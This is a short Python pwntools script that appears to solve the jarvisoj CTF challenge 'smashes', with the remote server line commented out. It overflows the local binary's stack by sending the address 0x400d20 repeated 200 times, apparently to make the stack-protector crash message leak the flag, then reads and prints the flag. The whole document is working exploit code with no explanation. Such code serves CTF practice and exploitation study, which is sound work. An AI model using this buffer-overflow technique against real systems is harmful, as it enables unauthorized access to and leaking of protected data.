from pwn import *
context.log_level = 'debug'
#p = remote("pwn.jarvisoj.com",9877)
p=process('./smashes')
p.recv()
p.sendline(p64(0x400d20)*200)
p.recv()
p.sendline()
flag=p.recv()
print(flag)
